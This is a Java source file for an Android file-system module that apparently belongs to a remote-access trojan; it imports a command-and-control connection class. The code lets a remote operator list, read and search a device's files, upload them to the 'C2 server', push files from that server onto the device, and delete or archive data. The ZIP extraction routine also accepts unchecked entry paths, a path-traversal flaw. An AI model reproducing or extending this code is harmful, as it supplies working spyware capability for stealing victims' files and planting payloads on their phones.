package com.tarjon.admin.utils;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 * Manages file system operations such as browsing, uploading, and downloading files
 */
public class FileSystemManager {
    private static final String TAG = "FileSystemManager";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    // Default buffer size for file operations
    private static final int BUFFER_SIZE = 8192;
    
    public FileSystemManager(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newCachedThreadPool();
    }
    
    /**
     * List files and directories in a specified path
     * @param directoryPath Path to list files from
     * @param callback Callback to receive file list
     */
    public void listFiles(String directoryPath, final FileListCallback callback) {
        executor.execute(() -> {
            try {
                File directory = new File(directoryPath);
                
                if (!directory.exists() || !directory.isDirectory()) {
                    if (callback != null) {
                        callback.onError("Path does not exist or is not a directory: " + directoryPath);
                    }
                    return;
                }
                
                // Get all files and directories
                File[] files = directory.listFiles();
                
                if (files == null) {
                    if (callback != null) {
                        callback.onError("Error listing files in: " + directoryPath);
                    }
                    return;
                }
                
                // Sort files (directories first, then by name)
                List<File> fileList = Arrays.asList(files);
                Collections.sort(fileList, new Comparator<File>() {
                    @Override
                    public int compare(File file1, File file2) {
                        if (file1.isDirectory() && !file2.isDirectory()) {
                            return -1;
                        } else if (!file1.isDirectory() && file2.isDirectory()) {
                            return 1;
                        } else {
                            return file1.getName().compareToIgnoreCase(file2.getName());
                        }
                    }
                });
                
                // Create JSON result
                JSONObject result = new JSONObject();
                result.put("path", directoryPath);
                result.put("canonicalPath", directory.getCanonicalPath());
                
                // Add parent directory info
                File parent = directory.getParentFile();
                if (parent != null && parent.exists()) {
                    result.put("parent", parent.getAbsolutePath());
                    result.put("hasParent", true);
                } else {
                    result.put("hasParent", false);
                }
                
                // Add file list
                JSONArray filesArray = new JSONArray();
                
                for (File file : fileList) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("isDirectory", file.isDirectory());
                    fileObj.put("size", file.length());
                    fileObj.put("sizeFormatted", formatFileSize(file.length()));
                    fileObj.put("lastModified", file.lastModified());
                    
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                    fileObj.put("lastModifiedFormatted", sdf.format(new Date(file.lastModified())));
                    
                    fileObj.put("canRead", file.canRead());
                    fileObj.put("canWrite", file.canWrite());
                    fileObj.put("canExecute", file.canExecute());
                    fileObj.put("isHidden", file.isHidden());
                    
                    // Add file type and extension
                    if (!file.isDirectory()) {
                        String fileName = file.getName();
                        int lastDotPos = fileName.lastIndexOf('.');
                        
                        if (lastDotPos > 0 && lastDotPos < fileName.length() - 1) {
                            String extension = fileName.substring(lastDotPos + 1).toLowerCase(Locale.US);
                            fileObj.put("extension", extension);
                            fileObj.put("type", getFileType(extension));
                        } else {
                            fileObj.put("extension", "");
                            fileObj.put("type", "unknown");
                        }
                    } else {
                        fileObj.put("extension", "");
                        fileObj.put("type", "directory");
                        
                        // Count items in directory
                        File[] subFiles = file.listFiles();
                        fileObj.put("itemCount", subFiles != null ? subFiles.length : 0);
                    }
                    
                    filesArray.put(fileObj);
                }
                
                result.put("files", filesArray);
                result.put("count", filesArray.length());
                
                // Add storage information
                result.put("storage", getStorageInfo());
                
                // Send to callback
                if (callback != null) {
                    callback.onFileListLoaded(result.toString());
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error listing files: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error listing files: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Get information about the device's storage
     */
    private JSONObject getStorageInfo() throws JSONException {
        JSONObject storageInfo = new JSONObject();
        
        // Internal storage
        File internalPath = Environment.getDataDirectory();
        long internalTotal = internalPath.getTotalSpace();
        long internalFree = internalPath.getFreeSpace();
        long internalUsed = internalTotal - internalFree;
        
        JSONObject internalStorage = new JSONObject();
        internalStorage.put("path", internalPath.getAbsolutePath());
        internalStorage.put("total", internalTotal);
        internalStorage.put("free", internalFree);
        internalStorage.put("used", internalUsed);
        internalStorage.put("totalFormatted", formatFileSize(internalTotal));
        internalStorage.put("freeFormatted", formatFileSize(internalFree));
        internalStorage.put("usedFormatted", formatFileSize(internalUsed));
        internalStorage.put("usagePercentage", internalTotal > 0 ? (internalUsed * 100) / internalTotal : 0);
        
        storageInfo.put("internal", internalStorage);
        
        // External storage
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            File externalPath = Environment.getExternalStorageDirectory();
            long externalTotal = externalPath.getTotalSpace();
            long externalFree = externalPath.getFreeSpace();
            long externalUsed = externalTotal - externalFree;
            
            JSONObject externalStorage = new JSONObject();
            externalStorage.put("path", externalPath.getAbsolutePath());
            externalStorage.put("total", externalTotal);
            externalStorage.put("free", externalFree);
            externalStorage.put("used", externalUsed);
            externalStorage.put("totalFormatted", formatFileSize(externalTotal));
            externalStorage.put("freeFormatted", formatFileSize(externalFree));
            externalStorage.put("usedFormatted", formatFileSize(externalUsed));
            externalStorage.put("usagePercentage", externalTotal > 0 ? (externalUsed * 100) / externalTotal : 0);
            
            storageInfo.put("external", externalStorage);
        }
        
        return storageInfo;
    }
    
    /**
     * Get file contents as text
     * @param filePath Path to the file
     * @param callback Callback to receive file content
     */
    public void getFileContent(String filePath, final FileContentCallback callback) {
        executor.execute(() -> {
            try {
                File file = new File(filePath);
                
                if (!file.exists() || file.isDirectory()) {
                    if (callback != null) {
                        callback.onError("File does not exist or is a directory: " + filePath);
                    }
                    return;
                }
                
                // Check if file is binary
                if (isBinaryFile(file)) {
                    if (callback != null) {
                        callback.onError("File appears to be binary and cannot be displayed as text");
                    }
                    return;
                }
                
                // Check file size
                long fileSize = file.length();
                if (fileSize > 5 * 1024 * 1024) { // Limit to 5MB
                    if (callback != null) {
                        callback.onError("File is too large to display (> 5MB)");
                    }
                    return;
                }
                
                // Read file content
                StringBuilder content = new StringBuilder();
                try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(file))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        content.append(line).append("\n");
                    }
                }
                
                // Create JSON result
                JSONObject result = new JSONObject();
                result.put("path", filePath);
                result.put("name", file.getName());
                result.put("size", file.length());
                result.put("sizeFormatted", formatFileSize(file.length()));
                result.put("lastModified", file.lastModified());
                
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                result.put("lastModifiedFormatted", sdf.format(new Date(file.lastModified())));
                
                result.put("content", content.toString());
                
                // Get file extension and type
                String fileName = file.getName();
                int lastDotPos = fileName.lastIndexOf('.');
                
                if (lastDotPos > 0 && lastDotPos < fileName.length() - 1) {
                    String extension = fileName.substring(lastDotPos + 1).toLowerCase(Locale.US);
                    result.put("extension", extension);
                    result.put("type", getFileType(extension));
                } else {
                    result.put("extension", "");
                    result.put("type", "unknown");
                }
                
                // Send to callback
                if (callback != null) {
                    callback.onFileContentLoaded(result.toString());
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error reading file content: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error reading file content: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Download a file from the device to the C2 server
     * @param filePath Path to the file
     * @param listener Listener for operation progress and completion
     */
    public void downloadFile(String filePath, final FileOperationListener listener) {
        executor.execute(() -> {
            try {
                File file = new File(filePath);
                
                if (!file.exists() || file.isDirectory()) {
                    if (listener != null) {
                        listener.onError("File does not exist or is a directory: " + filePath);
                    }
                    return;
                }
                
                // Create metadata
                JSONObject metadata = new JSONObject();
                metadata.put("path", filePath);
                metadata.put("name", file.getName());
                metadata.put("size", file.length());
                metadata.put("lastModified", file.lastModified());
                
                // Start upload
                c2Connection.uploadFile(filePath, "file", metadata.toString(), new C2Connection.UploadCallback() {
                    @Override
                    public void onProgress(int progress, long bytesUploaded, long totalBytes) {
                        if (listener != null) {
                            listener.onProgress(progress);
                        }
                    }
                    
                    @Override
                    public void onComplete(String fileId) {
                        if (listener != null) {
                            listener.onComplete(filePath);
                        }
                    }
                    
                    @Override
                    public void onError(String error) {
                        if (listener != null) {
                            listener.onError(error);
                        }
                    }
                });
                
            } catch (Exception e) {
                Log.e(TAG, "Error downloading file: " + e.getMessage());
                if (listener != null) {
                    listener.onError("Error downloading file: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Upload a file from the C2 server to the device
     * @param fileId ID of the file on the server
     * @param destinationPath Destination path on the device
     * @param listener Listener for operation progress and completion
     */
    public void uploadFile(String fileId, String destinationPath, final FileOperationListener listener) {
        executor.execute(() -> {
            try {
                File destination = new File(destinationPath);
                
                // Create parent directories if they don't exist
                File parentDir = destination.getParentFile();
                if (parentDir != null && !parentDir.exists()) {
                    parentDir.mkdirs();
                }
                
                // Start download
                c2Connection.downloadFile(fileId, destinationPath, new C2Connection.DownloadCallback() {
                    @Override
                    public void onProgress(int progress, long bytesDownloaded, long totalBytes) {
                        if (listener != null) {
                            listener.onProgress(progress);
                        }
                    }
                    
                    @Override
                    public void onComplete(String filePath) {
                        if (listener != null) {
                            listener.onComplete(filePath);
                        }
                    }
                    
                    @Override
                    public void onError(String error) {
                        if (listener != null) {
                            listener.onError(error);
                        }
                    }
                });
                
            } catch (Exception e) {
                Log.e(TAG, "Error uploading file: " + e.getMessage());
                if (listener != null) {
                    listener.onError("Error uploading file: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Delete a file or directory
     * @param path Path to delete
     * @param recursive Whether to delete directories recursively
     * @param callback Callback for operation result
     */
    public void deleteFile(String path, boolean recursive, final FileOperationCallback callback) {
        executor.execute(() -> {
            try {
                File file = new File(path);
                
                if (!file.exists()) {
                    if (callback != null) {
                        callback.onError("File or directory does not exist: " + path);
                    }
                    return;
                }
                
                boolean success;
                
                if (file.isDirectory()) {
                    if (recursive) {
                        success = deleteRecursive(file);
                    } else {
                        // Check if directory is empty
                        File[] files = file.listFiles();
                        if (files != null && files.length > 0) {
                            if (callback != null) {
                                callback.onError("Directory is not empty and recursive delete is not enabled");
                            }
                            return;
                        }
                        
                        success = file.delete();
                    }
                } else {
                    success = file.delete();
                }
                
                if (success) {
                    if (callback != null) {
                        callback.onSuccess("File or directory deleted successfully: " + path);
                    }
                } else {
                    if (callback != null) {
                        callback.onError("Failed to delete file or directory: " + path);
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error deleting file: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error deleting file: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Delete a directory recursively
     */
    private boolean deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            File[] children = fileOrDirectory.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        
        return fileOrDirectory.delete();
    }
    
    /**
     * Create a new directory
     * @param path Path to create directory in
     * @param dirName Name of the new directory
     * @param callback Callback for operation result
     */
    public void createDirectory(String path, String dirName, final FileOperationCallback callback) {
        executor.execute(() -> {
            try {
                File parent = new File(path);
                
                if (!parent.exists() || !parent.isDirectory()) {
                    if (callback != null) {
                        callback.onError("Parent directory does not exist: " + path);
                    }
                    return;
                }
                
                File newDir = new File(parent, dirName);
                
                if (newDir.exists()) {
                    if (callback != null) {
                        callback.onError("Directory already exists: " + newDir.getAbsolutePath());
                    }
                    return;
                }
                
                boolean success = newDir.mkdir();
                
                if (success) {
                    if (callback != null) {
                        callback.onSuccess("Directory created successfully: " + newDir.getAbsolutePath());
                    }
                } else {
                    if (callback != null) {
                        callback.onError("Failed to create directory: " + newDir.getAbsolutePath());
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error creating directory: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error creating directory: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Create a new file with the given content
     * @param path Path to create file in
     * @param fileName Name of the new file
     * @param content Content of the new file
     * @param callback Callback for operation result
     */
    public void createFile(String path, String fileName, String content, final FileOperationCallback callback) {
        executor.execute(() -> {
            try {
                File parent = new File(path);
                
                if (!parent.exists() || !parent.isDirectory()) {
                    if (callback != null) {
                        callback.onError("Parent directory does not exist: " + path);
                    }
                    return;
                }
                
                File newFile = new File(parent, fileName);
                
                if (newFile.exists()) {
                    if (callback != null) {
                        callback.onError("File already exists: " + newFile.getAbsolutePath());
                    }
                    return;
                }
                
                // Write content to file
                try (java.io.FileWriter writer = new java.io.FileWriter(newFile)) {
                    writer.write(content);
                }
                
                if (callback != null) {
                    callback.onSuccess("File created successfully: " + newFile.getAbsolutePath());
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error creating file: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error creating file: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Rename a file or directory
     * @param path Path to the file or directory
     * @param newName New name
     * @param callback Callback for operation result
     */
    public void renameFile(String path, String newName, final FileOperationCallback callback) {
        executor.execute(() -> {
            try {
                File file = new File(path);
                
                if (!file.exists()) {
                    if (callback != null) {
                        callback.onError("File or directory does not exist: " + path);
                    }
                    return;
                }
                
                File parent = file.getParentFile();
                if (parent == null) {
                    if (callback != null) {
                        callback.onError("Cannot determine parent directory");
                    }
                    return;
                }
                
                File newFile = new File(parent, newName);
                
                if (newFile.exists()) {
                    if (callback != null) {
                        callback.onError("A file or directory with that name already exists");
                    }
                    return;
                }
                
                boolean success = file.renameTo(newFile);
                
                if (success) {
                    if (callback != null) {
                        callback.onSuccess("File or directory renamed successfully to: " + newName);
                    }
                } else {
                    if (callback != null) {
                        callback.onError("Failed to rename file or directory");
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error renaming file: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error renaming file: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Copy a file or directory
     * @param sourcePath Source path
     * @param destinationPath Destination path
     * @param callback Callback for operation result
     */
    public void copyFile(String sourcePath, String destinationPath, final FileOperationCallback callback) {
        executor.execute(() -> {
            try {
                File sourceFile = new File(sourcePath);
                
                if (!sourceFile.exists()) {
                    if (callback != null) {
                        callback.onError("Source file or directory does not exist: " + sourcePath);
                    }
                    return;
                }
                
                File destFile = new File(destinationPath);
                
                if (destFile.exists()) {
                    if (callback != null) {
                        callback.onError("Destination already exists: " + destinationPath);
                    }
                    return;
                }
                
                boolean success;
                
                if (sourceFile.isDirectory()) {
                    success = copyDirectory(sourceFile, destFile);
                } else {
                    success = copyFile(sourceFile, destFile);
                }
                
                if (success) {
                    if (callback != null) {
                        callback.onSuccess("File or directory copied successfully to: " + destinationPath);
                    }
                } else {
                    if (callback != null) {
                        callback.onError("Failed to copy file or directory");
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error copying file: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error copying file: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Copy a single file
     */
    private boolean copyFile(File sourceFile, File destFile) throws IOException {
        try (FileInputStream fis = new FileInputStream(sourceFile);
             FileOutputStream fos = new FileOutputStream(destFile)) {
            
            byte[] buffer = new byte[BUFFER_SIZE];
            int length;
            
            while ((length = fis.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
            }
            
            return true;
        }
    }
    
    /**
     * Copy a directory recursively
     */
    private boolean copyDirectory(File sourceDir, File destDir) throws IOException {
        if (!destDir.exists()) {
            destDir.mkdirs();
        }
        
        File[] files = sourceDir.listFiles();
        if (files == null) {
            return false;
        }
        
        for (File file : files) {
            File destFile = new File(destDir, file.getName());
            
            if (file.isDirectory()) {
                copyDirectory(file, destFile);
            } else {
                copyFile(file, destFile);
            }
        }
        
        return true;
    }
    
    /**
     * Move a file or directory
     * @param sourcePath Source path
     * @param destinationPath Destination path
     * @param callback Callback for operation result
     */
    public void moveFile(String sourcePath, String destinationPath, final FileOperationCallback callback) {
        executor.execute(() -> {
            try {
                File sourceFile = new File(sourcePath);
                
                if (!sourceFile.exists()) {
                    if (callback != null) {
                        callback.onError("Source file or directory does not exist: " + sourcePath);
                    }
                    return;
                }
                
                File destFile = new File(destinationPath);
                
                if (destFile.exists()) {
                    if (callback != null) {
                        callback.onError("Destination already exists: " + destinationPath);
                    }
                    return;
                }
                
                // Try direct rename first (faster if on same filesystem)
                boolean success = sourceFile.renameTo(destFile);
                
                if (!success) {
                    // If rename fails, try copy + delete
                    if (sourceFile.isDirectory()) {
                        success = copyDirectory(sourceFile, destFile) && deleteRecursive(sourceFile);
                    } else {
                        success = copyFile(sourceFile, destFile) && sourceFile.delete();
                    }
                }
                
                if (success) {
                    if (callback != null) {
                        callback.onSuccess("File or directory moved successfully to: " + destinationPath);
                    }
                } else {
                    if (callback != null) {
                        callback.onError("Failed to move file or directory");
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error moving file: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error moving file: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Compress files into a ZIP archive
     * @param sourcePaths List of source paths to compress
     * @param destinationPath Destination ZIP file path
     * @param callback Callback for operation result
     */
    public void compressFiles(List<String> sourcePaths, String destinationPath, final FileOperationCallback callback) {
        executor.execute(() -> {
            try {
                if (sourcePaths == null || sourcePaths.isEmpty()) {
                    if (callback != null) {
                        callback.onError("No source files specified");
                    }
                    return;
                }
                
                // Check if all source files exist
                List<File> sourceFiles = new ArrayList<>();
                for (String path : sourcePaths) {
                    File file = new File(path);
                    if (!file.exists()) {
                        if (callback != null) {
                            callback.onError("Source file does not exist: " + path);
                        }
                        return;
                    }
                    sourceFiles.add(file);
                }
                
                File destFile = new File(destinationPath);
                
                // Create parent directories if they don't exist
                File parentDir = destFile.getParentFile();
                if (parentDir != null && !parentDir.exists()) {
                    parentDir.mkdirs();
                }
                
                // Create ZIP file
                try (FileOutputStream fos = new FileOutputStream(destFile);
                     BufferedOutputStream bos = new BufferedOutputStream(fos);
                     ZipOutputStream zos = new ZipOutputStream(bos)) {
                    
                    byte[] buffer = new byte[BUFFER_SIZE];
                    
                    for (File sourceFile : sourceFiles) {
                        if (sourceFile.isDirectory()) {
                            zipDirectory(sourceFile, sourceFile.getName(), zos, buffer);
                        } else {
                            zipFile(sourceFile, "", zos, buffer);
                        }
                    }
                }
                
                if (callback != null) {
                    callback.onSuccess("Files compressed successfully to: " + destinationPath);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error compressing files: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error compressing files: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Add a directory to a ZIP archive recursively
     */
    private void zipDirectory(File directory, String parentPath, ZipOutputStream zos, byte[] buffer) throws IOException {
        File[] files = directory.listFiles();
        if (files == null) {
            return;
        }
        
        for (File file : files) {
            if (file.isDirectory()) {
                String path = parentPath + "/" + file.getName();
                ZipEntry entry = new ZipEntry(path + "/");
                zos.putNextEntry(entry);
                zos.closeEntry();
                zipDirectory(file, path, zos, buffer);
            } else {
                zipFile(file, parentPath, zos, buffer);
            }
        }
    }
    
    /**
     * Add a file to a ZIP archive
     */
    private void zipFile(File file, String parentPath, ZipOutputStream zos, byte[] buffer) throws IOException {
        String entryPath = parentPath.isEmpty() ? file.getName() : parentPath + "/" + file.getName();
        ZipEntry entry = new ZipEntry(entryPath);
        zos.putNextEntry(entry);
        
        try (FileInputStream fis = new FileInputStream(file);
             BufferedInputStream bis = new BufferedInputStream(fis)) {
            
            int read;
            while ((read = bis.read(buffer)) != -1) {
                zos.write(buffer, 0, read);
            }
        }
        
        zos.closeEntry();
    }
    
    /**
     * Extract a ZIP archive
     * @param archivePath Path to the ZIP archive
     * @param extractPath Path to extract to
     * @param callback Callback for operation result
     */
    public void extractArchive(String archivePath, String extractPath, final FileOperationCallback callback) {
        executor.execute(() -> {
            try {
                File archiveFile = new File(archivePath);
                
                if (!archiveFile.exists() || !archiveFile.isFile()) {
                    if (callback != null) {
                        callback.onError("Archive file does not exist: " + archivePath);
                    }
                    return;
                }
                
                File extractDir = new File(extractPath);
                
                // Create extract directory if it doesn't exist
                if (!extractDir.exists()) {
                    extractDir.mkdirs();
                }
                
                // Extract ZIP file
                try (FileInputStream fis = new FileInputStream(archiveFile);
                     ZipInputStream zis = new ZipInputStream(fis)) {
                    
                    byte[] buffer = new byte[BUFFER_SIZE];
                    ZipEntry entry;
                    
                    while ((entry = zis.getNextEntry()) != null) {
                        String entryName = entry.getName();
                        File entryFile = new File(extractDir, entryName);
                        
                        // Create parent directories if needed
                        if (entry.isDirectory()) {
                            entryFile.mkdirs();
                            continue;
                        } else {
                            entryFile.getParentFile().mkdirs();
                        }
                        
                        // Extract file
                        try (FileOutputStream fos = new FileOutputStream(entryFile);
                             BufferedOutputStream bos = new BufferedOutputStream(fos)) {
                            
                            int read;
                            while ((read = zis.read(buffer)) != -1) {
                                bos.write(buffer, 0, read);
                            }
                        }
                        
                        zis.closeEntry();
                    }
                }
                
                if (callback != null) {
                    callback.onSuccess("Archive extracted successfully to: " + extractPath);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error extracting archive: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error extracting archive: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Search for files matching a pattern
     * @param rootPath Root path to search in
     * @param query Search query (filename or content)
     * @param searchContent Whether to search file contents
     * @param callback Callback for search results
     */
    public void searchFiles(String rootPath, String query, boolean searchContent, final FileSearchCallback callback) {
        executor.execute(() -> {
            try {
                File rootDir = new File(rootPath);
                
                if (!rootDir.exists() || !rootDir.isDirectory()) {
                    if (callback != null) {
                        callback.onError("Root directory does not exist: " + rootPath);
                    }
                    return;
                }
                
                List<File> results = new ArrayList<>();
                searchFilesRecursive(rootDir, query, searchContent, results);
                
                // Create JSON result
                JSONObject result = new JSONObject();
                result.put("query", query);
                result.put("rootPath", rootPath);
                result.put("searchContent", searchContent);
                
                JSONArray filesArray = new JSONArray();
                
                for (File file : results) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("isDirectory", file.isDirectory());
                    fileObj.put("size", file.length());
                    fileObj.put("sizeFormatted", formatFileSize(file.length()));
                    fileObj.put("lastModified", file.lastModified());
                    
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                    fileObj.put("lastModifiedFormatted", sdf.format(new Date(file.lastModified())));
                    
                    filesArray.put(fileObj);
                }
                
                result.put("files", filesArray);
                result.put("count", filesArray.length());
                
                // Send to callback
                if (callback != null) {
                    callback.onSearchCompleted(result.toString());
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error searching files: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error searching files: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Search for files recursively
     */
    private void searchFilesRecursive(File directory, String query, boolean searchContent, List<File> results) {
        File[] files = directory.listFiles();
        if (files == null) {
            return;
        }
        
        for (File file : files) {
            // Check filename match
            if (file.getName().toLowerCase(Locale.US).contains(query.toLowerCase(Locale.US))) {
                results.add(file);
            }
            // Check content match
            else if (searchContent && !file.isDirectory() && !isBinaryFile(file)) {
                try {
                    boolean found = false;
                    
                    // Only check reasonable file sizes
                    if (file.length() < 10 * 1024 * 1024) { // 10MB limit
                        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(file))) {
                            String line;
                            while ((line = reader.readLine()) != null) {
                                if (line.toLowerCase(Locale.US).contains(query.toLowerCase(Locale.US))) {
                                    found = true;
                                    break;
                                }
                            }
                        }
                    }
                    
                    if (found) {
                        results.add(file);
                    }
                } catch (Exception e) {
                    // Skip file if error
                }
            }
            
            // Recurse into subdirectories
            if (file.isDirectory()) {
                searchFilesRecursive(file, query, searchContent, results);
            }
        }
    }
    
    /**
     * Check if a file is binary or text
     */
    private boolean isBinaryFile(File file) {
        // Only check a sample of the file
        int checkLength = 1000;
        
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] bytes = new byte[checkLength];
            int read = fis.read(bytes, 0, Math.min(checkLength, (int) file.length()));
            
            if (read <= 0) {
                return false;
            }
            
            // Count null bytes and control characters
            int nullCount = 0;
            int controlCount = 0;
            
            for (int i = 0; i < read; i++) {
                if (bytes[i] == 0) {
                    nullCount++;
                } else if (bytes[i] < 32 && bytes[i] != 9 && bytes[i] != 10 && bytes[i] != 13) {
                    // Not tab, LF, or CR
                    controlCount++;
                }
            }
            
            // If more than 10% of the bytes are null or control characters, consider it binary
            return (nullCount + controlCount) > (read / 10);
            
        } catch (Exception e) {
            return true; // Consider it binary if error
        }
    }
    
    /**
     * Get file type based on extension
     */
    private String getFileType(String extension) {
        if (extension == null || extension.isEmpty()) {
            return "unknown";
        }
        
        switch (extension.toLowerCase(Locale.US)) {
            // Images
            case "jpg":
            case "jpeg":
            case "png":
            case "gif":
            case "bmp":
            case "webp":
                return "image";
                
            // Audio
            case "mp3":
            case "wav":
            case "ogg":
            case "flac":
            case "aac":
            case "m4a":
                return "audio";
                
            // Video
            case "mp4":
            case "avi":
            case "mkv":
            case "mov":
            case "wmv":
            case "webm":
                return "video";
                
            // Documents
            case "pdf":
                return "pdf";
            case "doc":
            case "docx":
                return "word";
            case "xls":
            case "xlsx":
                return "excel";
            case "ppt":
            case "pptx":
                return "powerpoint";
            case "txt":
            case "rtf":
                return "text";
                
            // Archives
            case "zip":
            case "rar":
            case "7z":
            case "tar":
            case "gz":
                return "archive";
                
            // Code
            case "java":
            case "kt":
            case "c":
            case "cpp":
            case "h":
            case "js":
            case "html":
            case "css":
            case "php":
            case "py":
            case "xml":
            case "json":
                return "code";
                
            // Android
            case "apk":
                return "apk";
                
            // Database
            case "db":
            case "sqlite":
            case "sqlite3":
                return "database";
                
            // Other
            default:
                return "file";
        }
    }
    
    /**
     * Format file size into human-readable form
     */
    private String formatFileSize(long size) {
        if (size <= 0) {
            return "0 B";
        }
        
        final String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        
        return String.format(Locale.US, "%.2f %s", 
                size / Math.pow(1024, digitGroups), 
                units[digitGroups]);
    }
    
    /**
     * Clean up resources
     */
    public void release() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
    
    /**
     * Callback interface for file list operations
     */
    public interface FileListCallback {
        void onFileListLoaded(String filesJson);
        void onError(String error);
    }
    
    /**
     * Callback interface for file content operations
     */
    public interface FileContentCallback {
        void onFileContentLoaded(String contentJson);
        void onError(String error);
    }
    
    /**
     * Callback interface for file operations
     */
    public interface FileOperationCallback {
        void onSuccess(String message);
        void onError(String error);
    }
    
    /**
     * Callback interface for file search operations
     */
    public interface FileSearchCallback {
        void onSearchCompleted(String resultsJson);
        void onError(String error);
    }
    
    /**
     * Listener interface for file operations with progress
     */
    public interface FileOperationListener {
        void onProgress(int progress);
        void onComplete(String filePath);
        void onError(String error);
    }
}